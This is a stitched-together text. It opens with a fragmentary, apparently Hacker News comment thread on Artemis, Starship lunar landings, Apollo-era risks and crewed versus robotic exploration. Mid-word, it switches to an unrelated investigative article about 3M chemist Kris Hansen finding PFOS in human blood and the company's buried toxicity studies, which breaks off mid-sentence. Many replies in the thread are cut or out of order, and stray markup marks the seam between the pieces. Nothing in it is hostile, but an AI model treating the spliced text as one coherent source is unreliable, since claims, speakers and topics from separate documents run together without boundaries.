achieved a weekly launch cadence over a span of six launches starting in November 2020. [21] Recovering Superheavy stages is not a NASA requirement for HLS, but it's a huge cost driver for SpaceX given the number of launches involved. « Why Not MarsIdle Words brevity is for the weak Frequent Topics antarctica argentina art aviation bio blogs canada china food france iraq meta nyc poland politics rant space tech travel vermont web work Greatest Hits The Alameda-Weehawken Burrito Tunnel The story of America's most awesome infrastructure project.

The moon is not so far away in terms of distance but it is very far away in terms of Δv because, not least, you have to land propulsively because there is no atmosphere to slow you down. Trips to some near-Earth asteroids are easier than the lunar surface, Mars and Venus aren't that much harder because in any of those cases the Moon's gravity can be helpful.

Not least, but certainly the requirement to brake before you land must be on the small order compared to achieving escape velocity from the much bigger rock I'm on? reply PaulHoule 3 hours agorootparentYou gotta get off Earth no matter where you go in space. It's almost free to come home from LEO, you get a huge amount of free velocity change returning from the moon. (At the cost of rejecting the heat) In the rocket equation https://en.wikipedia.org/wiki/Tsiolkovsky_rocket_equation the required mass ratio is an exponential function of the velocity change so adding another 2.5 km/sec for this and another 2.5 km/sec for that you are making the mission much more difficult. It's bad enough that it takes two stages to get to LEO comfortably but going beyond that adds cost and complexity pretty quick, for instance the large number of Starship launches required to get a Moon mission into the right orbit. I like to think about what interstellar travellers would do if they wanted to land on the Earth on the assumption that they are accustomed to life in deep space and have spent 1,000 to 10,000 years \"living off the land\" off comets and rouge planets and are used to a lifestyle like cutting up a planet like Pluto and building a number of small ringworlds powered by D-D fusion. I'd conjecture that despite having advanced technology they would still find the \"reverse space shuttle\" problem where you land with a full load of fuel and then take off from the ground to be difficult. It's not like they are going to haul a space shuttle along with them and would probably find it non-trivial to 3-d print one from plans that old. My take is that it would probably take them a decade to figure it out and that they might well come up with an alternative answer like https://en.wikipedia.org/wiki/Skyhook_(structure) which depends on in-space infrastructure that they'd be experience with although it could work together with an air-breathing aircraft which would be something new for them. reply ryandrake 3 hours agorootparentprevEverything is on the small order of magnitude when compared with getting into Earth orbit.

That Wikipedia article doesn't explain the concept as well as I'd like but the papers it references do. reply kqr 10 hours agoprevI didn't live through the early space programmes, but having read about them recently, I'm surprised by how incremental they (and the Soviet Sputnik and Vostok counterparts) were. - The early Mercury flights developed the idea of putting a human in a capsule on top of an ICBM to see what happens at altitude and during re-entry. - Later Mercury flights experimented with de-orbiting techniques. (The early flights didn't need that because the ICBMs that launched the first people into space did so on a ballistic trajectory – they never achieved orbit.) - With Gemini we figured out things like endurance (what is it like to have humans in space for weeks), rendezvous and docking (incredibly difficult), and extravehicular activities (preparation for walking on another astronomical body.) - Early Apollo was focused entirely on solving multi-stage flights without humans on board. - With Apollo 7 we verified the command module was good enough to attempt to send a few laps around the moon, which happened with Apollo 8, while we were still waiting for a fully functioning lander. - Apollo 9 was a dry run of the entire moon landing sequence – except in low Earth orbit. - Apollo 10 repeated the same exercise from Apollo 9 except in Lunar orbit. - Apollo 11 is often considered the first moon landing, but from the perspective of the program, it was really just another experiment: can we repeat Apollo 10 except also make a brief touch-and-go anywhere on the lunar surface? - Even Apollo 12 isn't really a moon landing proper, but another experiment: can we repeat Apollo 11 but now also make a precision touchdown? It wasn't until somewhere around Apollo 14/15 where the main purpose of the missions started becoming scientifically exploring the moon. That's something like 25 crewed flights at various stages of development that had as their purpose to explore/learn about just one or two new aspects of the future moon missions, pushing the envelope a little further. Granted, many of these things we have fresh practise in thanks to the space station, but also many of them we don't. It seems a little weird to bet it all on a small number of big bang launches. reply GMoromisato 4 hours agoparentThis is an excellent narrative, but I think it omits the many risks the program took to get to the moon before the Soviets. For example, Apollo 8 was the first time a Saturn V (and command module) was sent all the way to the moon, and it was done with a crew. Because there was no lander, there was no backup in case the command module had a problem. If the explosion on Apollo 13 had happened on Apollo 8, the crew would have died in space and never returned. Remember also that Apollo 8 orbited the moon--it wasn't just a free-return trajectory. The command module had to fire to get into lunar orbit (for the first time ever) and even more importantly, fire to get out (also for the first time ever). Apollo 8 was originally supposed to have a lunar lander--everyone felt safer with a \"lifeboat\" just in case. But delays on the lander program meant that they either had to delay Apollo 8 (and miss the end of the decade deadline and maybe the claim to land first) or fly without. The safe course was to delay, but NASA decided to take the risk. The magic of the Apollo era is that they made it look so easy that we forget how hard it was. The tragedy of Apollo 1 highlights that even simple things, like testing a new capsule on the ground, are incredibly risky. Apollo 6, the second uncrewed flight of Saturn V was almost a disaster. The booster vibrated badly because of engine instability, and two second stage engines shut down early. But on the very next flight, they decided to send it up with a crew. This would be the equivalent of putting humans on board the next Starship test launch (IFT-4). Sure, the timeline seems incremental, but only because the dates are omitted. Mercury 1 was in 1961 and the first moon landing was only 8 years later. In contrast, SLS started development in 2011, using existing Shuttle engines and solid rocket motors, and the first landing probably won't happen before 2028. reply smallmancontrov 4 hours agorootparentYeah, the risk appetite was much higher. Those are good reminders on Apollo 1/6/8, but the problems didn't stop there. The first 5 landing missions all had huge problems that nearly killed everyone, too. Only the last 2 landings were sort of OK. Apollo 1: burned all astronauts alive ... Apollo 10: POGO oscillations on launch (Saturn V still trying to tear itself apart), LEM tumbling Apollo 11: Computer kept crashing all the way down to the moon (it controlled the engines) Apollo 12: Brownout in the command module during launch, \"Set SCE to Aux\" Apollo 13: Oxygen tank fire. So rough they made a movie. Apollo 14: Shorted abort button almost killed everyone Apollo 15: Parachute failure --------- We have no shortage of people who would be willing to put their life on the line, but we do have a shortage of the political urgency/unity to tolerate actual problems. Just look at people dig into Elon Musk every time he explodes a prototype with his own money and nobody on board, and realize that accelerating a human program creates 10x the political sniping opportunity. reply kqr 3 hours agorootparentYou're sensationalising a little. The abort button on Apollo 14 would at worst have rendezvouzed the lander with the orbiter prior to landing on the moon. It would have killed the mission, but definitely not the astronauts. The brownout also had several safe abort alternatives and the question was only ever about how to continue the mission, not how to save people. reply cratermoon 3 hours agorootparentprevCounterpoint: all of those incidents, except Apollo 1 are proof that the engineering was great, because nobody died. For example, you mention the computer on the Apollo 11 lunar module crashing. In fact, it was recovering and working properly. The astronauts had left the rendezvous radar on during descent, in case it was needed for abort. That was not a nominal configuration, and the radar kept stealing cycles and causing the guidance computer to be overloaded with tasks. Remember, it was a hard real time system. What did the computer do? Reset and prioritize the key task: landing. Apollo 12: Got hit (twice) by lightning. The electrical system wasn't fried, it survived it, in a protective mode. Importantly, the computers in the Instrument Unit, placed on the third stage, were completely unaffected. Apollo 15: One lost parachute, still landed safely (if a bit hard) because of redundancy. I could go on, but you get the point. It was a well-engineered system backed by a team of engineers. reply GMoromisato 2 hours agorootparentMaybe. But it's hard to tell whether nobody died because the system was robust vs. nobody died because we got lucky. For example, there were several cases of burn-through on the O-rings before Challenger. The engineers thought there was enough margin to not worry about it, so they didn't Similarly, when Columbia was hit by foam-ice on ascent no one worried because it had happened before and nobody had died. reply twh270 28 minutes agorootparentCorrection -- at least for Challenger, engineers did not think there was margin, and argued against the launch. At the technical level, both tragedies were caused by design flaws. Organizationally and culturally, multiple factors contributed, but an attitude of \"nothing has happened yet, so this is fine\" (normalizing risk) was a major one. reply smallmancontrov 2 hours agorootparentprevWe don't disagree about the engineering being excellent. I was commenting on safety culture. A few days ago I saw Tory Bruno explain with visible frustration how they canceled the launch due to a valve that had to be cycled before it behaved. In that environment, the Apollo risks would not have been tolerated, even though they turned out to have been good bets. reply Analemma_ 3 hours agorootparentprevApollo 13 also had severe pogo on launch. Obviously it's overshadowed by the unrelated oxygen tank issues later, but that mission actually got extremely lucky that the oscillations happened to occur in such a way that the computer noticed the issue and shut down the affected engine. That could easily not have been the case, and if the oscillations had continued for a few more seconds it would have destroyed the vehicle. reply leoedin 7 hours agoparentprevIterative development is the only way you can do R&D. That truth was clearly known by NASA leadership in the 60s in a way that clearly isn’t today. I think it’s probably a symptom of wider culture. In the 60s every major industry was in the middle of a massive improvement cycle, a lot of the engineers would have learned their skills during the R&D boom of the Second World War, and everything was still manufactured locally. It was the perfect environment for rapid engineering improvement. Most of that has gone today. The major physical technologies we use - vehicles, appliances, manufacturing technology, have largely been solved. Improvement is incremental. If you did a survey of 100 engineers across the aerospace industry you’d probably find a handful who had any experience of boundary pushing R&D - most of the work is in documenting changes and making slight tweaks. SpaceX is definitely an exception. reply slowmovintarget 1 hour agorootparentIterative (repeating) and incremental (additive).

Otherwise the Soviet Union would have filled the large gaps between infrequent launches with their incremental successes. reply sidewndr46 5 hours agorootparentThe other thing you have to remember is that back in that era, the various military agencies all had a vested interest in rocket technology. Either for suborbital attack profiles or for orbital reasons like recon satellites (which at one point were assumed to be manned, but that didn't prove required). NASA wound up giving Congress a way to partially unify some of this. Saturn V obviously isn't an ICBM, but if we have the people and technology to make a man-rated rocket to get to the moon it's pretty safe to assume we can build ICBMs to any specification. The military wasn't thrilled with this early on because it meant rockets that were seen as weapons needed to be designed with huge safety margins. In the end a sort of uneasy truce arose from this and lead to the Space Shuttle. This was intended to create a civilian program with indefinite access to low earth orbit, servicing military and intelligence needs when required. Once it became apparent this was impossible, Congress gave the DoD the go ahead to resume spending on their own ride to space. This in turn lead to the absolute debacle that was the Titan IV. This lead to the EELV program which gave us Atlas V. By this point the US's capabilities had declined so much the best we could do was strap a US made fuel tank to a bunch of Russian made rockets. reply kqr 9 hours agorootparentprevSure, that's probably true.

They're iterating on Starship. Falcon 9 started out with an LEO payload of 10.4 tons and they managed to get it up to 22.8 in its current iteration. By all accounts Starship's payload isn't up to expectations right now but SpaceX has lots of knobs they intend to turn to get it up. They'll try them and see, but there's no way to know what will work and how much right now. So really nobody knows at this point how many refueling launches it will take. Should NASA have committed to this design before the kinks were worked out. No really but Congress had put them in an impossible position so I think they didn't have a choice. But this is risk that happens at the start of the mission before any astronauts board. If things go badly here they can always abort. Unlike the landing on the Moon. And rapid launches and orbital refueling are something SpaceX is going to be working on a lot anyways regardless of the Artemis program. Unlike the landing on the Moon. reply bryanlarsen 4 hours agoparent> No really but Congress had put them in an impossible position so I think they didn't have a choice. It's an \"impossible\" situation they've been in many times before and had a standard strategy to weasel out of: award the contract for more money than Congress has allocated, and then slip the project to the right until you get enough money. Every large NASA contract has worked this way, even their contracts with SpaceX -- Commercial Crew (aka Crew Dragon) was several years late because the project was underfunded in its initial years. SpaceX's $3B bid for HLS broke this unwritten convention. reply zefhous 17 hours agoprevDestin from Smarter Every Day gave a talk that addresses a lot of these issues that I found pretty interesting too. https://youtu.be/OoJsPvmFixU reply fastball 11 hours agoparentMy problem with his criticism (and to some extent echoed by Maciej in this article) is that the main takeaway seems to be \"we did it once, we can do it again, let's revisit the past instead of re-inventing the wheel\". But I don't think anyone actively involved wants to revisit the past. Who wants to go back to the moon just because we can? Nobody. Assuming best intentions: - People at NASA want to go to the moon to build a permanent base there. Maybe this is just to beat China, maybe it will actually be very useful to have a moon base. But that is the stated goal. - People at SpaceX want to go to the moon as a way to fund Starship development, so that they can go to Mars. - People at Lockheed Martin / Aerojet Rocketdyne / etc just want to get paid. I am going to ignore this cohort for the purposes of my argument. These motivations are not served by doing what the Apollo missions did. Can you get to the moon and back on a Saturn V with a single rocket launch, making for a much simpler mission plan? Absolutely, we did it 6 times. Can you build a moon base using a series of Saturn V launches? Absolutely not. Would SpaceX (clearly the most competent launch provider available in 2024) get anything out of building a much smaller HLS / not using methalox / anything else that would be more practical if your only purpose was to go to the moon? Also no – SpaceX doesn't really care about the moon. So a mission profile that is actually optimized for the moon does little for them. So while I think overall Artemis is a dumpster fire of spending, I don't think pointing at the Apollo missions is the gotcha that critics seem to think it is. reply bayindirh 11 hours agorootparentFrom my understanding, nobody is telling that \"We should use Apollo as-is\", but \"why don't we use the same spirit when we were building these back then?\". Everything made/designed in Apollo are no short of marvels. Today we can do much better with lighter, smaller electronics, and should be able to do weight savings or at least cost savings where it matters. Instead Artemis feels like \"let's dig the parts pile and put what we have together, and invent the glue required for the missing parts\", akin to today's Docker based development ecosystem. Yes, the plan might be to carry much more equipment in fewer launches, but if something looks like a duck, walks like a duck and quacks like a duck, it's a duck. If this amount of people are saying that something is lost in spirit and some stuff is not done in an optimal way, I tend to believe them. reply imiric 10 hours agorootparent> From my understanding, nobody is telling that \"We should use Apollo as-is\", but \"why don't we use the same spirit when we were building these back then?\". The political climate in the 1960s was far more tense than it is today, which fueled the space race in ways that forced both sides to give their absolute best efforts to move space exploration forward. While arguably today there are comparable tensions, countries no longer have to prove anything to the world, and space exploration is mostly a scientific endeavour fueled by private companies that want to make a profit. There's less of an urgency to get to the moon, which can explain that difference in spirit that you mention. FWIW I don't think that's a bad thing. Space exploration is the most difficult human endeavour, and taking the time to do it right seems like the optimal way to go. The fact world superpowers achieved what they did in a couple of decades of the last century, a mere 60 years after flying machines were invented, is nothing short of extraordinary. But it was a special time, and we shouldn't feel pressured to repeat it. > Instead Artemis feels like \"let's dig the parts pile and put what we have together, and invent the glue required for the missing parts\", akin to today's Docker based development ecosystem. That doesn't seem like a bad approach to me. There is a lot of value to be gained by gluing existing technology together, and if anything, Docker is proof of how wildly successful that can be.

I think that all the examples you mentioned pale in comparison to the terror of global annihilation from nuclear weapons, a couple of decades after the bloodiest war in human history, during the peak of the Cold War. Conflicts exist today as well, and there is an increasing risk of a global conflict, but there is no urgency of beating an adversary ideologically because you can't fight them militarily. There was a nationwide competitive spirit back then that just doesn't exist today, which caused nations to accomplish things that seem impossible in hindsight. > It's just that the US looks a lot weaker and less competent today. I wouldn't say the US as a whole, since as a country it's still a leader in science and technology, and it has sufficient financial resources to invest in this project, if it wanted to. I think it boils down to the lack of urgency and political/public support, and perhaps managerial and competency problems at NASA itself. > (But perhaps that is hindsight?

By some measures, China has overtaken the US economically, and they have a space program with a focus on the moon, yet both sides are sloppy in their own ways. I think we'll get there eventually, but it will take more attempts, time and resources than we planned for. And, to be fair, it took 11 missions for Apollo to land on the moon, 10 Gemini missions before it, and many failures along the way. But if you take a look at the rate of progress, and time between missions, it's clear that getting to the moon was US' primary objective in the '60s, which is far from what it is today. reply rockemsockem 7 hours agorootparentI certainly agree with the lack of political support, but the American public never supported Apollo.

I wasn't alive nor in the US during that period, so can only infer from what I've seen and read, but I would wager that even the staunchest opponents of the US space program back then couldn't have helped but feel pride of what their country accomplished in such a short time. And even if the majority opposed it, I still think that overall the amount of supporters then would've been greater than the amount of people who support it today. We're living in a time of ignorance and public disinterest in science that Carl Sagan predicted in the '90s[1], which didn't exist in the '60s.

But still, I think the article has a point when it describes the difficulties of landing Starship on the moon and being able to lift off again several days later. Landing a rocket on its tail is cool when the only consequence of a failure is not being able to reuse the rocket, but when there are human lives in the balance, it starts to sound really scary. Not to mention the possibility of damaging an engine during the landing or of fuel loss preventing them from lifting off again... reply rst 3 hours agorootparentThe point is more that compared to prior landers, the Starship version at least has a uniquely high center of gravity over a narrow base, which makes it a whole lot easier to tip, and amplifies the consequences of, say, leg damage. reply dotnet00 2 hours agorootparentThe center of mass should be pretty low relative to the height of the lander, the engines and propellant are the heaviest parts, the engines are obviously at the bottom.

And when you're just refueling it every flight, rather than building a bespoke new rocket (as with SLS), the cost for twelve launches would likely be significantly lower than one SLS launch.

No it won't, for a very, very simple reason: Every single kilogram of stuff you launch from the moon, has to be launched FIRST from exactly that \"deeper gravity well\" here on Earth. Including btw. the fuel required to launch it. Because the Moon is shockingly devoid of any steelworks, factories, fuel refineries, Astronaut training facilities, food processing plants or any of the other myriad sources of stuff required in space. So yeah, launching something from 1/6th of Earths gravity is easier. However, all this does, is add another launch to the equation. > How do you see us developing the technology for humans to leave the solar system if we never develop the technology to visit the moon? For the same reason why we developed radio transmission, without first inventing super-sonic carrier pidgeons. Technology does not only advance incrementially. Ever so often, a radically new technology emerges, that is leaps and bounds better than existing systems, and often wasn't developed from these systems either. And btw. Rocket Engines are just one such technology as it happens. Before them, the strongest way to propel something through the air, were propellers, a technology which we since improved by alot, but is still incapable (and never will be capable to) put things into space.

In fact it's the opposite: One of the most important restrictions regarding the LRVs driving distance wasn't technological in nature, it was due to the the fact it had to carry humans: https://en.wikipedia.org/wiki/Lunar_Roving_Vehicle#Usage An operational constraint on the use of the LRV was that the astronauts must be able to walk back to the LM if the LRV were to fail at any time during the EVA (called the \"Walkback Limit\"). Thus, the traverses were limited in the distance they could go at the start and at any time later in the EVA. And even though they relaxed the constraints later on, the fact still remains: As soon as you have a human in the mix, things become more cumbersome, way more expensive, slower, less risks can be taken, and if things go wrong, the results can suddenly involve dead people instead of just trashed equipment. reply elsonrodriguez 3 hours agorootparentIf our world-wide herculean efforts towards building a self driving robotic car have yielded mediocre results, I have low expectations for a robotic field geologist built on a NASA budget.

The Shuttle towards the end of its life had an estimated chance of loss of crew of 1 in 90, and two administrations decided that was untenable. The standard for missions to ISS is 1:250.

If the lottery money comes through, then there was really no need for the pension fund. But without the lottery win, there’s not enough money in the pension account to retire on. The two strategies don't make sense together. I don't think this analogy works, and it reflects a bigger issue with the essay. Unlike a pension fund, gateway and lunar landings don't actually seem to do anything or move us forward. Like many of NASA's human spaceflight programs (and a decent amount of its unmanned spaceflight programs), they seem to be doing something just to be doing it. So a better analogy might be using half of your money to buy lottery tickets, and setting the other half on fire. Buying lottery tickets might not be a great way to spend money, but it's at least possible you'll get some return from it. reply idlewords 14 hours agoparentPersonally, I agree with you that the whole program is useless. The point I'm trying to make with this analogy is that the effort is internally incoherent even if you grant the premise that moon landings and building Gateway are desirable outcomes. reply davedx 8 hours agorootparentWhat do you think is useful for NASA to do?

I feel like we're squandering an amazing chance to explore space by getting stuck on sending people instead of leveraging the enormous progress in microelectronics, robotics, and autonomy of the last 60 years. reply playingonline 43 minutes agorootparentIf we did want to become a spacefaring, world-hopping, intergalactic, etc., species in the long term, we wouldn't be sending humans into space right now, because robots are easier to keep alive and do more science with. That was the overall point I got from this and why not mars, which seems true for now. But, even though putting humans on the rockets makes them cost more, it also garners more funding. I don't know, maybe we could convince all American schoolchildren to aspire to be robot programmers rather than astronauts. But typing this out, it seems like: a) you could ask congress to fund robotic exploration, which maybe citizens care about and support, but if they don't then... b) you could instead set up a giant human space program that wastes tens of billions of dollars to do nothing, then quietly siphon off a few billion here or there for JPL or SpaceX to do valuable unmanned research. Maybe the former is possible, and you're fighting the good fight, but most voters don't read long blog posts comparing manned vs unmanned space exploration, and really when it comes to space are only excited by people standing on the moon. I do hope you convince more people, but fortunately whatever monstrosity we have now is at least a nice jobs program. reply thisaccount546 5 hours agorootparentprevThe weird thing about NASA's budget when you look at it[1] is that funding allocation appears to be inversely proportional to the benefit. Human spaceflight is the largest chunk, at 44.9% of the budget. Aeronautics and technology are at the bottom, with technology being allocated 4.9% of the budget, and aeronautics 3.5%. There were good reasons why people were interested in sending people into space in the early days of space exploration. Before automated systems were sufficiently developed, manned programs looked like the best choice. But once automated systems became sufficiently advanced, it was clear that they were the way to go. You can see this when it comes to reconnaissance satellites - both the U.S. (with the uncompleted Manned Orbital Laboratory) and the USSR (with Almaz, which was completed) began with the idea of having manned reconnaissance satellites, but as time progressed they realized autonomous ones were better. If we were sticking people in reconnaissance satellites just for the sake of sticking them in reconnaissance satellites today, it would obviously be farcical. But NASA’s manned space program has being doing the equivalent for decades - blowing a huge part of their budget on sending people into space just for the sake of sending them into space (by the 80’s this had reached the poin",

Kris Hansen had worked as a chemist at the 3M Corporation for about a year when her boss, an affable senior scientist named Jim Johnson, gave her a strange assignment. 3M had invented Scotch Tape and Post-­it notes; it sold everything from sandpaper to kitchen sponges. But on this day, in 1997, Johnson wanted Hansen to test human blood for chemical contamination. Several of 3M’s most successful products contained man-made compounds called fluorochemicals. In a spray called Scotchgard, fluorochemicals protected leather and fabric from stains. In a coating known as Scotchban, they prevented food packaging from getting soggy. In a soapy foam used by firefighters, they helped extinguish jet-fuel fires. Johnson explained to Hansen that one of the company’s fluorochemicals, PFOS — short for perfluorooctanesulfonic acid — often found its way into the bodies of 3M factory workers. Although he said that they were unharmed, he had recently hired an outside lab to measure the levels in their blood. The lab had just reported something odd, however. For the sake of comparison, it had tested blood samples from the American Red Cross, which came from the general population and should have been free of fluorochemicals. Instead, it kept finding a contaminant in the blood. Johnson asked Hansen to figure out whether the lab had made a mistake. Detecting trace levels of chemicals was her specialty: She had recently written a doctoral dissertation about tiny particles in the atmosphere. Hansen’s team of lab technicians and junior scientists fetched a blood sample from a lab-­supply company and prepped it for analysis. Then Hansen switched on an oven-­size box known as a mass spectrometer, which weighs molecules so that scientists can identify them. As the lab equipment hummed around her, Hansen loaded a sample into the machine. A graph appeared on the mass spectrometer’s display; it suggested that there was a compound in the blood that could be PFOS. That’s weird, Hansen thought. Why would a chemical produced by 3M show up in people who had never worked for the company? Hansen didn’t want to share her results until she was certain that they were correct, so she and her team spent several weeks analyzing more blood, often in time-consuming overnight tests. All the samples appeared to be contaminated. When Hansen used a more precise method, liquid chromatography, the results left little doubt that the chemical in the Red Cross blood was PFOS. Hansen now felt obligated to update her boss. Johnson was a towering, bearded man, and she liked him: He seemed to trust her expertise, and he found something to laugh about in most conversations. But, when she shared her findings, his response was cryptic. “This changes everything,” he said. Before she could ask him what he meant, he went into his office and closed the door. This was not the first time that Hansen had found a chemical where it didn’t belong. A wiry woman who grew up skiing competitively, Hansen had always liked to spend time outdoors; for her chemistry thesis at Williams College, she had kayaked around the former site of an electric company on the Hoosic River, collecting crayfish and testing them for industrial pollutants called polychlorinated biphenyls, or PCBs. Her research, which showed that a drainage ditch at the site was leaking the chemicals, prompted a news story and contributed to a cleanup effort overseen by the Massachusetts Department of Environmental Protection. At 3M, Hansen assumed that her bosses would respond to her findings with the same kind of diligence and care. Hansen stayed near Johnson’s office for the rest of the day, anxiously waiting for him to react to her research. He never did. In the days that followed, Hansen sensed that Johnson had notified some of his superiors. She remembers his boss, Dale Bacon, a paunchy fellow with gray hair, stopping by her desk and suggesting that she had made a mistake. “I don’t think so,” she told him. In subsequent weeks, Hansen and her team ordered fresh blood samples from every supplier that 3M worked with. Each of the samples tested positive for PFOS. 3M Global Headquarters in Maplewood, Minnesota In the middle of this testing, Johnson suddenly announced that he would be taking early retirement. After he packed up his office and left, Hansen felt adrift. She was so new to corporate life that her office clothes — pleated pants and dress shirts — still felt like a costume. Johnson had always guided her research, and he hadn’t told Hansen what she should do next. She reminded herself of what he had said — that the chemical wasn’t harmful in factory workers. But she couldn’t be sure that it was harmless. She knew that PCBs, for example, were mass-produced for years before studies showed that they accumulate in the food chain and cause a range of health issues, including damage to the brain. The most reliable way to gauge the safety of chemicals is to study them over time, in animals and, if possible, in humans. What Hansen didn’t know was that 3M had already conducted animal studies — two decades earlier. They had shown PFOS to be toxic, yet the results remained secret, even to many at the company. In one early experiment, conducted in the late ’70s, a group of 3M scientists fed PFOS to rats on a daily basis. Starting at the second-lowest dose that the scientists tested, about 10 milligrams for every kilogram of body weight, the rats showed signs of possible harm to their livers, and half of them died. At higher doses, every rat died. Soon afterward, 3M scientists found that a relatively low daily dose, 4.5 milligrams for every kilogram of body weight, could kill a monkey within weeks. (Based on this result, the chemical would currently fall into the highest of five toxicity levels recognized by the United Nations.) This daily dose of PFOS was orders of magnitude greater than the amount that the average person would ingest, but it was still relatively low — roughly comparable to the dose of aspirin in a standard tablet.

Support independent journalism by donating to ProPublica. Donate Now In 1979, an internal company report deemed PFOS “certainly more toxic than anticipated” and recommended longer-term studies. That year, 3M executives flew to San Francisco to consult Harold Hodge, a respected toxicologist. They told Hodge only part of what they knew: that PFOS had sickened and even killed laboratory animals and had caused liver abnormalities in factory workers. According to a 3M document that was marked “CONFIDENTIAL,” Hodge urged the executives to study whether the company’s fluorochemicals caused reproductive issues or cancer. After reviewing more data, he told one of them to find out whether the chemicals were present “in man,” and he added, “If the levels are high and widespread and the half-life is long, we could have a serious problem.” Yet Hodge’s warning was omitted from official meeting notes, and the company’s fluorochemical production increased over time. Hansen’s bosses never told her that PFOS was toxic. In the weeks after Johnson left 3M, however, she felt that she was under a new level of scrutiny. One of her superiors suggested that her equipment might be contaminated, so she cleaned the mass spectrometer and then the entire lab. Her results didn’t change. Another encouraged her to repeatedly analyze her syringes, bags and test tubes, in case they had tainted the blood. (They had not.) Her managers were less concerned about PFOS, it seemed to Hansen, than about the chance that she was wrong. Sometimes Hansen doubted herself. She was 28 and had only recently earned her Ph.D. But she continued her experiments, if only to respond to the questions of her managers. 3M bought three additional mass spectrometers, which each cost more than a car, and Hansen used them to test more blood samples. In late 1997, her new boss, Bacon, even had her fly out to the company that manufactured the machines, so that she could repeat her tests there. She studied the blood of hundreds of people from more than a dozen blood banks in various states. Each sample contained PFOS. The chemical seemed to be everywhere. When 3M was founded, in 1902, it was known as the Minnesota Mining and Manufacturing Company. After its mining operations flopped, the company pivoted to sandpaper and then to a series of clever inventions aimed at improving everyday life. An early employee noticed that autoworkers were struggling to paint two-tone cars, which were popular at the time; he eventually invented masking tape, using crêpe paper and cabinetmaker’s glue. Another 3M employee created Post-it notes to help him bookmark passages in his church hymnal. An official history of 3M, published for the company’s 100th anniversary, celebrated its “tolerance for tinkerers.” Fluorochemicals had their origins in the American effort to build the atomic bomb. During the Second World War, scientists for the Manhattan Project developed one of the first safe processes for bonding carbon to fluorine, a dangerously reactive element that experts had nicknamed “the wildest hellcat” of chemistry. After the war, 3M hired some Manhattan Project chemists and began mass-producing chains of carbon atoms bonded to fluorine atoms. The resulting chemicals proved to be astonishingly versatile, in part because they resist oil, water and heat. They are also incredibly long-lasting, earning them the moniker “forever chemicals.” In the early ’50s, 3M began selling one of its fluorochemicals, PFOA, to the chemical company DuPont for use in Teflon. Then, a couple of years later, a dollop of fluorochemical goo landed on a 3M employee’s tennis shoe, where it proved impervious to stains and impossible to wipe off. 3M now had the idea for Scotchgard and Scotchban. By the time Hansen was in elementary school, in the ’70s, both products were ubiquitous. Restaurants served French fries in Scotchban-treated packaging. Hansen’s mother sprayed Scotchgard on the living-­room couch. Hansen grew up in Lake Elmo, Minnesota, not far from 3M’s headquarters. Her father was one of the company’s star engineers and was even inducted into its hall of fame in 1979; he had helped to create Scotch-Brite scouring pads and Coban wrap, a soft alternative to sticky bandages. Once, he molded some fibers into cups, thinking that they might make a good bra. They turned out to be miserably uncomfortable, so he and his colleagues placed them over their mouths, giving the company the inspiration for its signature N95 mask. First image: Lake Elmo, Minnesota, the town not far from 3M headquarters where Kris Hansen grew up. Second image: Family photos of Paul Hansen, Kris’ father, at 3M functions over the years. Hansen never intended to follow her father to the company. She spent her childhood summers catching turtles and leopard frogs at the lake and hoped to have a career in environmental conservation. Her first job after earning her chemistry Ph.D. was on a boat, which took her to remote parts of the Pacific Ocean. But the voyage left her so seasick that she lost 20 pounds, and she soon retreated to Minnesota. In 1996, at her father’s suggestion, Hansen applied for a position in 3M’s environmental lab. After Hansen started her PFOS research, her relationships with some colleagues seemed to deteriorate. One afternoon in 1998, a trim 3M epidemiologist named Geary Olsen arrived with several vials of blood and asked her to test them. The next morning, she read the results to him and several colleagues — positive for PFOS. As Hansen remembers it, Olsen looked triumphant. “Those samples came from my horse,” he said — and his horse certainly wasn’t eating at McDonald’s or trotting on Scotchgarded carpets. Hansen felt that he was trying to humiliate her. (Olsen did not respond to requests for comment.) What Hansen wanted to know was how PFOS was making its way into animals. She found an answer in data from lab rats, which also appeared to have fluorochemicals in their blood. Rats that had more fish meal in their diets, she discovered, tended to have higher levels of PFOS, suggesting that the chemical had spread through the food chain and perhaps through water. In male lab rats, PFOS levels rose with age, indicating that the chemical accumulated in the body. But, curiously, in female rats the levels sometimes fell. Hansen was unsettled when toxicology reports indicated why: Mother rats seemed to be offloading the chemical to their pups. Exposure to PFOS could begin before birth. Another study confirmed that Scotchban and Scotchgard were sources of the chemical. PFOS wasn’t an official ingredient in either product, but both ­contained other fluorochemicals that, the study showed, broke down into PFOS in the bodies of lab rats. Hansen and her team ultimately found PFOS in eagles, chickens, rabbits, cows, pigs and other animals. They also found 14 ­additional fluorochemicals in human blood, including several produced by 3M. Some were present in wastewater from a 3M factory. At one point, Hansen told her father, Paul, that she was frustrated by the way senior colleagues kept questioning her work. Paul had recently retired, but he had confidence in 3M’s top executives, and he suggested that she take her findings directly to them. But as a relatively new employee — and one of the few women scientists at a company of about 75,000 people — Hansen found the idea preposterous. When Paul offered to talk to some of 3M’s executives himself, she was mortified at the idea of her father interceding. Hansen knew that if she could find a blood sample that didn’t contain PFOS then she might be able to convince her colleagues that the other samples did. She and her team began to study historical blood from the early decades of PFOS production. They soon found the chemical in blood from a 1969-71 Michigan breast cancer study. Then they ran an overnight test on blood that had been collected in rural China during the ’80s and ’90s. If any place were PFOS-free, she figured, it would be somewhere remote, where 3M products weren’t in widespread use. The next morning, anxious to see the results, Hansen arrived at the lab before anyone else. For the first time since she had begun testing blood, some of the samples showed no trace of PFOS. She was so struck that she called her husband. There was nothing wrong with her equipment or methodology; PFOS, a man-made chemical produced by her employer, really was in human blood, practically everywhere. Hansen’s team found it in Swedish blood samples from 1957 and 1971. After that, her lab analyzed blood that had been collected before 3M created PFOS. It tested negative. Apparently, fluorochemicals had entered human blood after the company started selling products that contained them. They had leached out of 3M’s sprays, coatings and factories — and into all of us. That summer, an in-house librarian at 3M delivered a surprising article to Hansen’s office mailbox. It had been written in 1981 by 3M scientists, and it described a method for measuring fluorine in blood, indicating that even back then the company was testing for fluorochemicals. One scientist mentioned in the article, Richard Newmark, still worked for 3M, in a low-lying structure nicknamed the “nerdy building.” Hansen arranged to meet with him there. Newmark, a collegial man with a compact build, told Hansen that, more than 20 years before, two academic scientists, Donald Taves and Warren Guy, had discovered a fluorochemical in human blood. They had wondered whether Scotchgard might be its source, so they approached 3M. Newmark told her that his subsequent experiments had confirmed their suspicions — the chemical was PFOS — but 3M lawyers had urged his lab not to admit it. As Hansen wrote all this down in a notebook, she felt anger rising inside her. Why had so many colleagues doubted the soundness of her results if earlier 3M experiments had already proved the same thing? After the meeting, she hurried back to the lab to find Bacon. “He knew!” she told him. Bacon’s face remained expressionless. He told Hansen to 